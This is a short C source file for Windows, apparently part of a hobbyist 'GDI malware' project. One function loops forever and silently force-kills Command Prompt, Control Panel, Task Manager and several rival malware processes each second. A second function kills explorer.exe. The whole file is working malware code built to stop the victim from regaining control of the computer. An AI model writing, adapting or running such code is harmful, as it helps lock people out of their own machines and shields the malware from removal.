#include "przejebane.h"

VOID
WINAPI
SuspendUtils(
	VOID
)
{
	for ( ;; )
	{
		// Programs
		ShellExecuteW( NULL, 0, L"taskkill", L"/f /im cmd.exe", NULL, SW_HIDE );
		ShellExecuteW( NULL, 0, L"taskkill", L"/f /im control.exe", NULL, SW_HIDE );
		ShellExecuteW( NULL, 0, L"taskkill", L"/f /im taskmgr.exe", NULL, SW_HIDE );

		// GDI Malwares
		ShellExecuteW( NULL, 0, L"taskkill", L"/f /im MUVCrack.exe", NULL, SW_HIDE );
		ShellExecuteW( NULL, 0, L"taskkill", L"/f /im MUVCrack Malware.exe", NULL, SW_HIDE );
		ShellExecuteW( NULL, 0, L"taskkill", L"/f /im Sendius.exe", NULL, SW_HIDE );

		ShellExecuteW( NULL, 0, L"taskkill", L"/f /im firemalre.exe", NULL, SW_HIDE );
        ShellExecuteW( NULL, 0, L"taskkill", L"/f /im chromalre.exe", NULL, SW_HIDE );
		ShellExecuteW( NULL, 0, L"taskkill", L"/f /im firemalre (Danger).exe", NULL, SW_HIDE );
        ShellExecuteW( NULL, 0, L"taskkill", L"/f /im chromalre (Danger).exe", NULL, SW_HIDE );

		// Kill some other malwares
		ShellExecuteW( NULL, 0, L"taskkill", L"/f /im xcf.exe", NULL, SW_HIDE );
        ShellExecuteW( NULL, 0, L"taskkill", L"/f /im cdm.exe", NULL, SW_HIDE );

		ShellExecuteW( NULL, 0, L"taskkill", L"/f /im Tetroxide.exe", NULL, SW_HIDE );
        ShellExecuteW( NULL, 0, L"taskkill", L"/f /im Monoxide.exe", NULL, SW_HIDE );
		Sleep( 1000 );
	}
}

VOID
WINAPI
KillPayload(
	VOID
)
{
	ShellExecuteW( NULL, 0, L"taskkill", L"/f /im explorer.exe", NULL, SW_HIDE );
}